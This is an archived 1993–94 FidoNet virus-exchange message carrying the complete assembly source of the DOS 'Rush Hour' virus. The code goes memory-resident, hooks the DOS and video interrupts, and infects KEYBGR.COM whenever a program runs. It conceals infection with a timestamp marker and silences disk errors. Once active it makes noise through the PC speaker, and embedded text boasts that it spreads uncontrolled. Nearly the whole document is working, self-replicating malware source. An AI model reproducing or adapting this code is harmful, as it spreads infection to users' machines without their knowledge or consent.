;Ä PVT.VIRII (2:465/65.4) ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ PVT.VIRII Ä
; Msg  : 27 of 54
; From : MeteO                               2:5030/136      Tue 09 Nov 93 09:13
; To   : -  *.*  -                                           Fri 11 Nov 94 08:10
; Subj : RUSHHOUR.DSM
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;.RealName: Max Ivanov
;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
;* Kicked-up by MeteO (2:5030/136)
;* Area : VIRUS (Int: ˆ­ä®p¬ æ¨ï ® ¢¨pãá å)
;* From : Dr T , 2:283/718 (06 Nov 94 16:49)
;* To   : Clif Jessop
;* Subj : RUSHHOUR.DSM
;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
;@RFC-Path:
;ddt.demos.su!f400.n5020!f3.n5026!f2.n51!f550.n281!f512.n283!f35.n283!f7.n283!f7
;18.n283!not-for-mail
;@RFC-Return-Receipt-To: Dr.T.@f718.n283.z2.fidonet.org
    PAGE 72,132
    TITLE Virus "RUSH HOUR" V1.0 (p) Foxi, 1986
    NAME VIRUS

ABS0        SEGMENT AT 0
        ORG 4*10h
VIDEO_INT   DW  2 DUP (?)   ; Video Interrupt

        ORG 4*21h
DOS_INT     DW  2 DUP (?)   ; DOS Interrupt

        ORG 4*24h
ERROR_INT   DW  2 DUP (?)   ; ERROR Interrupt
ABS0        ENDS

code    SEGMENT
    assume  cs:code, ds:code, es:code

    ORG 05Ch
FCB LABEL BYTE
DRIVE   DB  ?
FSPEC   DB  11 DUP (' ')    ; Filename
    ORG 6Ch
FSIZE   DW  2 DUP (?)
FDATE   DW  ?       ; date of last modifcation

FTIME   DW  ?       ; time of last mod
    ORG 80h
    DTA DW 128 DUP (?)  ; Disk Transfer Area (DTA)
    ORG 071Eh       ; END OF THE NORMAL KEYBGR.COM

    xor ax, ax
    mov es, ax      ; ES points to ABS0
    assume es:ABS0

    push cs
    pop ds

    mov ax, VIDEO_INT       ; store old interrupt vectors
    mov bx, VIDEO_INT+2
    mov word ptr VIDEO_VECTOR, ax
    mov word ptr VIDEO_VECTOR+2, bx
    mov ax, DOS_INT
    mov bx, DOS_INT+2
    mov word ptr DOS_VECTOR, ax
    mov word ptr DOS_VECTOR+2, bx
    cli
    mov DOS_INT, OFFSET VIRUS   ; new DOS vector points to VIRUS

    mov DOS_INT+2, cs
    mov VIDEO_INT, OFFSET DISEASE   ; video vector points to DISEASE
    mov VIDEO_INT+2, cs
    sti

    mov ah, 0       ; Get system time
    int 1Ah         ; read TimeOfDay (TOD)
    mov TIME_0, dx      ; CX:DX = number of clock ticks since midnight

    lea dx, VIRUS_ENDE
    int 27h         ; terminate program & remain resident (TSR)

VIDEO_VECTOR    DD  (?)
DOS_VECTOR  DD  (?)
ERROR_VECTOR    DW  2 DUP (?)
TIME_0      DW  ?

;
; VIRUS main program
;
; 1. System call AH=4BH?
;    No: --> 2
;    Yes: Test for KEYBGR.COM on specified drive
;     Already infected?
;     Yes :--> 3.
;     No  : Infection!
;
; 2. Jump to normal DOS

RNDVAL  DB  'bfhg'
ACTIVE  DB  0       ; not active
PRESET  DB  0       ; first virus not active

    DB  'A:'
FNAME   DB  'KEYBGR  COM'
    DB  0

VIRUS   PROC    FAR
    assume cs:code, ds:nothing, es:nothing

    push ax
    push cx
    push dx

    mov ah, 0       ; check if at least 15 minutes
    int 1ah         ; have elapsed since installation.

    sub dx, TIME_0
    cmp dx, 16384       ; 16384 ticks on the clock=15 minutes
    jl $3
    mov ACTIVE, 1       ; if so, activate virus

  $3:   pop dx
    pop cx
    pop ax

    ; disk access because of the DOS command
    ; "Load & execute program" ?
    cmp ax, 4B00h
    je $1

EXIT_1:
    jmp DOS_VECTOR      ; No: --> continue as normal

  $1:   push es         ; ES:BX --> parameter block
    push bx         ; DS:DX --> filename
    push ds         ; save registers which will be needed
    push dx         ; for INT 21H (AH=4Bh)

    mov DI, dx
    mov DRIVE, 0        ; set the drive of the program
    mov al, ds:[DI+1]   ; to be executed
    cmp al, ':'
    jne $5

    mov al, ds:[DI]
    sub al, 'A'-1
    mov DRIVE, al

  $5:   cld
    push cs
    pop ds
    xor ax, ax
    mov es, ax
    assume ds:code, es:ABS0

    mov ax, ERROR_INT   ; ignore all disk "errors"
    mov bx, ERROR_INT+2 ; with our own error routine
    mov ERROR_VECTOR, ax
    mov ERROR_VECTOR+2, bx
    mov ERROR_INT, OFFSET ERROR
    mov ERROR_INT+2, cs

    push cs
    pop es
    assume es:code

    lea dx, DTA     ; DS:DX -> Disk Transfer Area (DTA)
    mov ah, 1Ah     ; SET DISK TRANSFER AREA ADDRESS
    int 21h
    mov bx, 11      ; transfer the filename

  $2:
    mov al, fname-1[bx] ; into File Control Block (FCB)
    mov FSPEC-1[bx], al
    DEC bx
    JNZ $2

    lea dx, FCB     ; open file (for writing)
    mov ah, 0FH
    int 21H

    cmp al, 0
    jne EXIT_0      ; file does not exist --> end

    mov BYTE PTR FCB + 20h, 0
    mov ax, FTIME       ; file already infected?
    cmp ax, 4800h
    je EXIT_0       ; YES --> END

    mov PRESET, 1       ; (All copies are virulent !)
    mov SI, 100H        ; write the virus in the file

   $4:
    lea DI, DTA
    mov cx, 128
    REP MOVSB
    lea dx, FCB         ; DS:DX -> opened FCB
    mov ah, 15h         ; SEQUENTIAL WRITE TO FCB FILE
    int 21h

    cmp SI, OFFSET VIRUS_ENDE
    jl $4

    mov FSIZE, OFFSET VIRUS_ENDE - 100H
    mov FSIZE+2, 0      ; set correct file size
    mov FDATE, 0AA3h    ; set correct date (3-5-86)
    mov FTIME, 4800h    ; set time (09:00:00)

    lea dx, FCB     ; close file
    mov ah, 10h
    int 21h

    xor ax, ax
    mov es, ax
    assume es:ABS0

    mov ax, ERROR_VECTOR    ; reset the error interrupt
    mov bx, ERROR_VECTOR+2
    mov ERROR_INT, ax
    mov ERROR_INT+2, bx

   EXIT_0:
    pop dx          ; restore the saved registers
    pop ds
    pop bx
    pop es
    assume ds:nothing, es:nothing

    mov ax, 4B00h       ; "EXEC" - LOAD AND EXECUTE PROGRAM
    jmp DOS_VECTOR      ; normal function execution

VIRUS   ENDP

ERROR   PROC FAR
    IRET            ; simply ignore all errors...

ERROR   ENDP

DISEASE PROC FAR
    assume ds:nothing, es:nothing
    push ax         ; Save registers
    push cx

    test PRESET, 1
    jz EXIT_2

    test ACTIVE, 1
    jz EXIT_2

    IN  al, 61h     ; Enable speak (Bit 0 := 0)
    AND al, 0feh
    OUT 61h, al

    mov cx, 3           ; index loop cx
 NOISE:             ; generate Noise
    mov al, RNDVAL
    xor al, RNDVAL + 3
    SHL al, 1
    SHL al, 1
    RCL WORD PTR RNDVAL, 1
    RCL WORD PTR RNDVAL+2, 1

    mov ah, RNDVAL      ; output some bit
    and ah, 2       ; of the feedback
    IN al, 61h      ; shift register
    and al, 0FDh        ; --> noise from speaker
    OR al, ah
    OUT 61H, al

    LOOP NOISE

    and al, 0FCh        ; turn speaker off
    OR al,1
    OUT 61H, al

 EXIT_2:
    pop cx
    pop ax
    jmp VIDEO_VECTOR    ; jump to normal VIDEO routine ...

DISEASE ENDP

    DB 'This program is a VIRUS program.'
    DB 'Once activated it has control over all'
    DB 'system devices and even over all storage'
    DB 'media inserted by the user.  It continually'
    DB 'copies itself into uninfected operating'
    DB 'systems and thus spreads uncontrolled.'

    DB 'The fact that the virus does not destroy any'
    DB 'user programs or erase the disk is merely due'
    DB 'to a philanthropic trait of the author......'

    ORG 1C2Ah

VIRUS_ENDE  LABEL BYTE

code    ends

    end

;-+-  Concord/QWK O.O1 Beta-7
; + Origin: FidoNet * Mathieu Not‚ris * Brussels-Belgium-Europe (2:283/718)
;=============================================================================
;
;Yoo-hooo-oo, -!
;
;
;    þ The MeÂeO
;
;/os,/o,/op,/oiObject code: standard, standard w/overlays, Phar Lap, or IBM
;
;--- Aidstest Null: /Kill
; * Origin: ùPVT.ViRIIúmainúboardú / Virus Research labs. (2:5030/136)

